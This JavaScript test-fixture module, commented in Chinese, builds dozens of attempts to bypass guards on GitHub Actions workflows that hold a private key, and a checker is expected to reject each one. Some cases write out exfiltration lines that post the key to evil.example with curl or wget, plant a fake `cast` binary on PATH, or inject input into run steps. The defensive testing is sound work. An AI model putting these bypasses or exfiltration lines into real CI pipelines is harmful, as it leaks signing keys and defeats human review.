// PR #217 對抗式審查的 40 個繞過嘗試，改寫成以「現行 workflow」為底的案例。
// 每個案例改一處，回傳改過的整組檔案與「至少要出現的問題」。check-workflow-guards.test.mjs
// 逐一確認都被擋下。審查當時有 27 個通過了檢查器（B01–B09b、C01、C01b、C05、C05b、C07、D06、
// E01–E09），其中 E04、E06、E07、E09 審查判定不構成實際繞過，現在也一併擋下。
//
// 第二輪複審（N 系列）又找到 10 個通過檢查器的寫法：admin-call 守門之後的 step 加
// `if: always()`／`failure()`（N01*）、run 經 `env.X`／`toJSON(github)` 內插（N02*、N16）、
// 後續 step 的 `uses: docker://`、未釘 SHA 的 action、寫 `$GITHUB_PATH` 放假 `cast`（N04–N06）。
// 現在由兩層擋：第一層整檔釘選擋掉對持鑰 workflow 的「任何」修改；第二層結構規則另外擋
// N01*、N02*、N04、N05、N16。N06（改 PATH）是純 shell 內容，只有第一層擋得到（structural: null）。
//
// 每個案例有兩組預期：expect（完整檢查，含第一層）與 structural（只跑第二層，pins: null）。
// 替換目標找不到（workflow 改版了）就丟錯：案例不能默默變成「什麼都沒改」。

export const ADMIN = "admin-base-sepolia.yml";
const PRE_NAME = "      - name: Precheck — master、第一次執行、觸發者是 repo 擁有者本人\n";
const SET = "          set -euo pipefail\n";
const FOR_LOOP = /          for who in [\s\S]*?          done\n/;
const REF_IF = /          if \[ "\$REF" != "refs\/heads\/master" \]; then\n            echo [^\n]*\n            exit 1\n          fi\n/;

function section(text, jobId) {
  const header = `\n  ${jobId}:\n`;
  const start = text.indexOf(header);
  if (start === -1) throw new Error(`找不到 job ${jobId}`);
  const next = /\n  [A-Za-z0-9_-]+:\n/.exec(text.slice(start + header.length));
  return [start, next ? start + header.length + next.index : text.length];
}

/** 只在某個 job 的區段內替換。 */
export function inJob(text, jobId, from, to) {
  const [s, e] = section(text, jobId);
  const sec = text.slice(s, e);
  if (!(typeof from === "string" ? sec.includes(from) : from.test(sec))) throw new Error(`${jobId} 裡找不到替換目標：${from}`);
  return text.slice(0, s) + sec.replace(from, to) + text.slice(e);
}

function replaceOnce(text, from, to) {
  if (!(typeof from === "string" ? text.includes(from) : from.test(text))) throw new Error(`找不到替換目標：${from}`);
  return text.replace(from, to);
}

const rogue = (body) => ({ name: "rogue.yml", text: `name: rogue\non:\n  workflow_dispatch:\njobs:\n${body}` });
const HASH = (job) => new RegExp(`admin-base-sepolia\\.yml#${job}：守門 step 的內容與檢查器釘住的不符`);
/** 第一層（整檔釘選）的訊息。 */
export const PIN = (file) => new RegExp(`^${file.replace(/\./g, "\\.")}：這是持有私鑰的 workflow，任何修改都要人工審過整份 diff`);
const KEY = (job, key) => new RegExp(`admin-base-sepolia\\.yml#${job}：不可有這些鍵：[^（]*\`${key}\``);

/**
 * @param {{ name: string, text: string }[]} real 現行 repo 的 workflow
 * @returns {{ id: string, desc: string, files: { name: string, text: string }[], expect: RegExp[], structural: RegExp[] | null }[]}
 */
export function bypassCases(real) {
  const cases = [];
  const add = (id, desc, edits, extra, expect, structural = expect) => {
    let files = real.map((f) => ({ ...f }));
    for (const [file, fn] of edits) {
      const f = files.find((x) => x.name === file);
      if (!f) throw new Error(`${id}：找不到 ${file}`);
      const before = f.text;
      f.text = fn(f.text);
      if (f.text === before) throw new Error(`${id}：對 ${file} 的修改沒有任何效果`);
    }
    files = files.concat(extra);
    const list = (x) => (x === null ? null : Array.isArray(x) ? x : [x]);
    cases.push({ id, desc, files, expect: list(expect), structural: list(structural) });
  };
  const admin = (fn) => [[ADMIN, fn]];

  // ── B：shell／script 語意（審查 M2）──
  add("B01", "precheck 守門 step 加 `shell: cat {0}`（script 只被印出、不執行）",
    admin((t) => inJob(t, "precheck", PRE_NAME, `${PRE_NAME}        shell: cat {0}\n`)), [],
    /admin-base-sepolia\.yml#precheck：守門 step 不可有這些鍵：`shell`/);
  add("B02", "workflow 層級 `defaults.run.shell: cat {0}`",
    admin((t) => replaceOnce(t, "\njobs:\n", "\ndefaults:\n  run:\n    shell: cat {0}\n\njobs:\n")), [],
    /admin-base-sepolia\.yml：workflow 層級不可有這些鍵：`defaults`/);
  add("B02b", "admin-call job 層級 `defaults.run.shell`",
    admin((t) => inJob(t, "admin-call", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    defaults:\n      run:\n        shell: cat {0}\n")), [],
    KEY("admin-call", "defaults"));
  add("B03", "precheck script 開頭先 `exit 0`（之後的守門是死碼）",
    admin((t) => inJob(t, "precheck", SET, `${SET}          exit 0\n`)), [], HASH("precheck"));
  add("B03b", "admin-call 守門 step 開頭先 `exit 0`",
    admin((t) => inJob(t, "admin-call", SET, `${SET}          exit 0\n`)), [], HASH("admin-call"));
  add("B04", "守門的 if 行被註解掉，後面接 `if false; then exit 1; fi`",
    admin((t) => inJob(t, "admin-call", REF_IF, '          # if [ "$REF" != "refs/heads/master" ]; then\n          if false; then\n            exit 1\n          fi\n')), [],
    HASH("admin-call"));
  add("B05", "script 開頭把 REF／RUN_ATTEMPT／ACTOR 重新指派成合格值",
    admin((t) => inJob(t, "admin-call", SET, `${SET}          REF=refs/heads/master; RUN_ATTEMPT=1; ACTOR=$OWNER; TRIGGERING_ACTOR=$OWNER\n`)), [],
    HASH("admin-call"));
  add("B06", "整段守門包在 `if false; then … fi` 裡",
    admin((t) => inJob(inJob(t, "precheck", SET, `${SET}          if false; then\n`), "precheck", '          echo "precheck 通過：', '          fi\n          echo "precheck 通過：')), [],
    HASH("precheck"));
  add("B07", "守門放進函式定義但從不呼叫",
    admin((t) => inJob(inJob(t, "admin-call", SET, `${SET}          never_called() {\n`), "admin-call", "          norm() {", "          }\n          norm() {")), [],
    HASH("admin-call"));
  add("B08", "precheck 的觸發者比對整段刪掉（env 綁定保留）",
    admin((t) => inJob(t, "precheck", FOR_LOOP, "")), [], HASH("precheck"));
  add("B09", "approve 的 gate step 換成 `run: true`（不再檢查 required reviewers／ref／觸發者）",
    admin((t) => {
      const [s, e] = section(t, "approve");
      const sec = t.slice(s, e);
      const i = sec.indexOf("    steps:\n");
      if (i === -1) throw new Error("approve 沒有 steps");
      return `${t.slice(0, s)}${sec.slice(0, i)}    steps:\n      - run: "true"\n${t.slice(e)}`;
    }), [], HASH("approve"));
  add("B09b", "admin-call 守門的觸發者檢查刪掉",
    admin((t) => inJob(t, "admin-call", FOR_LOOP, "")), [], HASH("admin-call"));

  // ── C：secret 引用辨識 ──
  add("C01", "`${{ format('}}{0}', secrets.KEEPER_PRIVATE_KEY) }}`：字串常值裡的 `}}`（審查 L1）", [],
    [rogue("  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"$X\"\n        env:\n          X: ${{ format('}}{0}', secrets.KEEPER_PRIVATE_KEY) }}\n")],
    /rogue\.yml#leak：引用 secrets\.KEEPER_PRIVATE_KEY 但沒有綁 environment/);
  add("C01b", "同上，放在 admin precheck 的第二個 step",
    admin((t) => replaceOnce(t, "\n  approve:\n", "\n      - run: echo \"$X\"\n        env:\n          X: ${{ format('}}{0}', secrets.KEEPER_PRIVATE_KEY) }}\n\n  approve:\n")), [],
    [/admin-base-sepolia\.yml#precheck：不可使用任何 secret（secrets\.KEEPER_PRIVATE_KEY）/, /admin-base-sepolia\.yml#precheck：只能有守門這一個 step/]);
  add("C02", "`fromJSON(toJSON(secrets)).KEEPER_PRIVATE_KEY`", [],
    [rogue("  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"$X\"\n        env:\n          X: ${{ fromJSON(toJSON(secrets)).KEEPER_PRIVATE_KEY }}\n")],
    /rogue\.yml#leak：使用了動態或整包的 secrets 存取/);
  add("C03", "`secrets[format('{0}','KEEPER_PRIVATE_KEY')]`", [],
    [rogue("  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"$X\"\n        env:\n          X: ${{ secrets[format('{0}','KEEPER_PRIVATE_KEY')] }}\n")],
    /rogue\.yml#leak：使用了動態或整包的 secrets 存取/);
  add("C04", "不綁 environment 的 job 用本地 composite action，`with:` 傳私鑰", [],
    [rogue("  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n        with:\n          key: ${{ secrets.KEEPER_PRIVATE_KEY }}\n")],
    /rogue\.yml#leak：引用 secrets\.KEEPER_PRIVATE_KEY 但沒有綁 environment/);
  add("C05", "呼叫別的 repo 的 reusable workflow（對方的 job 自己綁 `environment: keeper`）", [],
    [rogue("  call:\n    uses: someone/else/.github/workflows/w.yml@main\n")],
    /rogue\.yml#call：不可用 job 層級的 `uses:` 呼叫 reusable workflow/);
  add("C05b", "同上，並以改名的對應把 secret 交給對方", [],
    [rogue("  call:\n    uses: someone/else/.github/workflows/w.yml@main\n    secrets:\n      KEEPER_PRIVATE_KEY: ${{ secrets.BASE_SEPOLIA_RPC_URL }}\n")],
    /rogue\.yml#call：不可用 job 層級的 `uses:` 呼叫 reusable workflow/);
  add("C06", "呼叫本地 reusable workflow＋`secrets: inherit`", [],
    [rogue("  call:\n    uses: ./.github/workflows/base-sepolia-keeper.yml\n    secrets: inherit\n")],
    [/rogue\.yml#call：使用了動態或整包的 secrets 存取/, /rogue\.yml#call：不可用 job 層級的 `uses:`/]);
  add("C07", "呼叫已在允許清單內的 base-sepolia-keeper.yml（不帶 secrets）", [],
    [rogue("  call:\n    uses: ./.github/workflows/base-sepolia-keeper.yml\n")],
    /rogue\.yml#call：不可用 job 層級的 `uses:` 呼叫 reusable workflow/);

  // ── D：environment 綁定與 YAML 解析 ──
  const envJob = (line) => rogue(`  x:\n    runs-on: ubuntu-latest\n${line}    steps:\n      - run: echo hi\n`);
  add("D01", "`environment: ${{ 'keeper' }}`", [], [envJob("    environment: ${{ 'keeper' }}\n")], /rogue\.yml#x：environment 名稱是動態的/);
  add("D02", "`environment: { name: ${{ vars.E }} }`", [], [envJob("    environment:\n      name: ${{ vars.E }}\n")], /rogue\.yml#x：environment 名稱是動態的/);
  add("D03", "`environment: KEEPER`（大小寫）", [], [envJob("    environment: KEEPER\n")], /rogue\.yml#x：不在 environment「keeper」的允許清單內/);
  add("D04", '鍵寫成 `"environ\\u006dent"`', [], [envJob('    "environ\\u006dent": keeper\n')], /rogue\.yml#x：不在 environment「keeper」的允許清單內/);
  add("D05", "多文件：第一份無害、第二份綁 keeper", [],
    [{ name: "rogue.yml", text: "name: a\non: workflow_dispatch\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n---\nname: b\non: workflow_dispatch\njobs:\n  b:\n    runs-on: ubuntu-latest\n    environment: keeper\n    steps:\n      - run: echo hi\n" }],
    /rogue\.yml：YAML 解析失敗/);
  add("D06", "merge key `<<:`（flow mapping，不用 anchor）", [], [envJob("    <<: { environment: keeper }\n")], /rogue\.yml：使用了 YAML merge key/);
  add("D07", "`%YAML 1.1` 指示詞＋綁 keeper", [],
    [{ name: "rogue.yml", text: "%YAML 1.1\n---\nname: a\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    environment: keeper\n    steps:\n      - run: echo hi\n" }],
    /rogue\.yml#x：不在 environment「keeper」的允許清單內/);
  add("D08", "`environment: !!binary a2VlcGVy`", [], [envJob("    environment: !!binary a2VlcGVy\n")], /rogue\.yml#x：environment 的名稱不是字串/);
  add("D09", "`? environment` 複合鍵寫法", [], [envJob("    ? environment\n    : keeper\n")], /rogue\.yml#x：不在 environment「keeper」的允許清單內/);
  add("D10", "admin-base-sepolia.yaml（副檔名不同）另放一支綁 keeper 的 admin-call", [],
    [{ name: "admin-base-sepolia.yaml", text: "name: a\non: workflow_dispatch\njobs:\n  admin-call:\n    runs-on: ubuntu-latest\n    environment: keeper\n    steps:\n      - run: echo hi\n" }],
    /admin-base-sepolia\.yaml#admin-call：不在 environment「keeper」的允許清單內/);

  // ── E：允許清單內的 job 被改成「免核准的 admin」（審查 M3）──
  add("E01", "price-keeper.yml#update-prices（允許清單內）加 workflow_dispatch inputs＋任意 cast send",
    [["price-keeper.yml", (t) => `${replaceOnce(t, "  workflow_dispatch:\n", "  workflow_dispatch:\n    inputs:\n      target: { required: false, default: '' }\n      sig: { required: false, default: '' }\n      args: { required: false, default: '' }\n")}\n      - name: extra\n        if: inputs.target != ''\n        env:\n          PK: \${{ secrets.KEEPER_PRIVATE_KEY }}\n          RPC: \${{ secrets.KEEPER_RPC_URL }}\n          TARGET: \${{ inputs.target }}\n          SIG: \${{ inputs.sig }}\n          ARGS: \${{ inputs.args }}\n        run: cast send "$TARGET" "$SIG" $ARGS --rpc-url "$RPC" --private-key "$PK"\n`]], [],
    /price-keeper\.yml：綁了 environment「keeper」的 workflow 不可有 `workflow_dispatch\.inputs`/);
  add("E02", "admin-call 後面的 step 把 inputs 直接內插進 run（稽核 O-4 的原始漏洞）",
    admin((t) => replaceOnce(t, '          cast send "$TARGET" "$FUNC" "${ARG_ARR[@]}" \\', '          cast send "$TARGET" "${{ inputs.function }}" ${{ inputs.args }} \\')), [],
    /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 的 `run` 直接內插了 \$\{\{ inputs\.function \}\}/);
  add("E03", "admin-call 加 `services:`，私鑰以 env 交給容器（容器在守門 step 之前啟動）",
    admin((t) => inJob(t, "admin-call", "    timeout-minutes: 10\n", "    timeout-minutes: 10\n    services:\n      s:\n        image: ghcr.io/someone/img\n        env:\n          PK: ${{ secrets.KEEPER_PRIVATE_KEY }}\n")), [],
    KEY("admin-call", "services"));
  add("E04", "admin workflow 多加 `schedule`／`issue_comment` 觸發",
    admin((t) => replaceOnce(t, "\non:\n  workflow_dispatch:\n", "\non:\n  issue_comment:\n  schedule:\n    - cron: '0 0 * * *'\n  workflow_dispatch:\n")), [],
    /admin-base-sepolia\.yml：觸發事件只能是 `workflow_dispatch`/);
  add("E05", "base-sepolia-keeper.yml 加 `issue_comment` 觸發＋把留言內插進 run",
    [["base-sepolia-keeper.yml", (t) => `${replaceOnce(t, /\non:\n/, "\non:\n  issue_comment:\n")}\n      - run: echo \${{ github.event.comment.body }}\n`]], [],
    [/base-sepolia-keeper\.yml：綁了 environment「keeper」的 workflow 只能用 schedule、workflow_dispatch 觸發（多了 `issue_comment`）/,
      /base-sepolia-keeper\.yml#keep：steps\[\d+\] 的 `run` 直接內插了 \$\{\{ github\.event\.comment\.body \}\}/]);
  add("E06", "approve 改成 `environment: {name: admin-approval, deployment: false}`",
    admin((t) => inJob(t, "approve", "    environment: admin-approval\n", "    environment:\n      name: admin-approval\n      deployment: false\n")), [],
    /admin-base-sepolia\.yml#approve：必須以字串寫法綁 environment「admin-approval」/);
  add("E07", "多一個 `skipme` job（if: false），precheck `needs: skipme`",
    admin((t) => replaceOnce(inJob(t, "precheck", "    runs-on: ubuntu-latest\n", "    needs: skipme\n    runs-on: ubuntu-latest\n"), "\njobs:\n", "\njobs:\n  skipme:\n    if: false\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n")), [],
    [/admin-base-sepolia\.yml#skipme：admin workflow 只能有 precheck、approve、admin-call 三個 job/, KEY("precheck", "needs")]);
  add("E08", "admin-call 守門以外的 step 設 continue-on-error（Validate inputs 失敗仍送交易）",
    admin((t) => replaceOnce(t, "      - name: Validate inputs\n", "      - name: Validate inputs\n        continue-on-error: true\n")), [],
    /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 不可設 `continue-on-error`/);
  add("E09", "precheck 加 job 層級的 env（BASH_ENV）",
    admin((t) => inJob(t, "precheck", "    permissions: {}\n", "    permissions: {}\n    env:\n      BASH_ENV: /dev/null\n")), [],
    KEY("precheck", "env"));

  // ── N：第二輪複審（整檔釘選＋結構規則 (g)）──
  const SEND = "      - name: Send owner transaction\n";
  const VAL = "      - name: Validate inputs\n";
  const VAL_RUN = `${VAL}        run: |\n`;
  const FOUNDRY = "      - name: Install Foundry\n";
  const NOIF = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 不可有 `if`/;
  const RUNEXPR = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 的 `run` 內插了/;
  const USES = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 的 `uses: [^`]*` 不允許/;
  const both = (structural) => [PIN(ADMIN), structural];
  add("N01", "Send step 加 `if: always()`（守門失敗仍送交易；re-run failed jobs 重播已核准的呼叫）",
    admin((t) => replaceOnce(t, SEND, `${SEND}        if: always()\n`)), [], both(NOIF), NOIF);
  add("N01b", "Send step 加 `if: ${{ failure() || success() }}`",
    admin((t) => replaceOnce(t, SEND, `${SEND}        if: \${{ failure() || success() }}\n`)), [], both(NOIF), NOIF);
  add("N01c", "新增一個 `if: failure()` step 外送私鑰（守門失敗才跑）",
    admin((t) => replaceOnce(t, FOUNDRY, `      - name: on-fail\n        if: failure()\n        env:\n          PK: \${{ secrets.KEEPER_PRIVATE_KEY }}\n        run: curl -d "$PK" https://evil.example\n${FOUNDRY}`)), [],
    both(NOIF), NOIF);
  add("N02", "Validate 的 run 內插 `${{ env.ARGS }}`（經 env 間接的 shell injection）",
    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo \${{ env.ARGS }}\n`)), [], both(RUNEXPR), RUNEXPR);
  add("N02b", "run 內插 `${{ fromJSON(toJSON(github)).event.inputs.args }}`",
    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo \${{ fromJSON(toJSON(github)).event.inputs.args }}\n`)), [], both(RUNEXPR), RUNEXPR);
  add("N02c", "run 內插 `${{ toJSON(github) }}`",
    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo '\${{ toJSON(github) }}'\n`)), [], both(RUNEXPR), RUNEXPR);
  add("N04", "Send 前插一步 `uses: docker://alpine:3` 並把私鑰給它",
    admin((t) => replaceOnce(t, SEND, `      - uses: docker://alpine:3\n        env:\n          PK: \${{ secrets.KEEPER_PRIVATE_KEY }}\n        with:\n          args: sh -c "wget -qO- --post-data=$PK https://evil.example"\n${SEND}`)), [],
    both(USES), USES);
  add("N05", "Install Foundry 改成未釘 SHA 的 tag `@v1`",
    admin((t) => replaceOnce(t, /foundry-toolchain@[0-9a-f]{40}/, "foundry-toolchain@v1")), [], both(USES), USES);
  add("N06", "Install Foundry 之後加一步寫 `$GITHUB_PATH` 放假的 cast（只有整檔釘選擋得到）",
    admin((t) => replaceOnce(t, VAL, `      - name: fake\n        run: |\n          mkdir -p /tmp/f\n          printf '%s\\n' '#!/bin/sh' 'curl -d "$*" https://evil.example' > /tmp/f/cast\n          chmod +x /tmp/f/cast\n          echo /tmp/f >> "$GITHUB_PATH"\n${VAL}`)), [],
    PIN(ADMIN), null);
  const N16 = /price-keeper\.yml#update-prices：steps\[\d+\] 的 `run` 內插了/;
  add("N16", "price-keeper 的 run 內插 `${{ env.X }}`，X 來自 github.event.inputs（沒有宣告 inputs）",
    [["price-keeper.yml", (t) => replaceOnce(t, /(\n    steps:\n)/, "$1      - env:\n          X: ${{ github.event.inputs.x }}\n        run: echo ${{ env.X }}\n")]], [],
    [PIN("price-keeper.yml"), N16], N16);

  return cases;
}
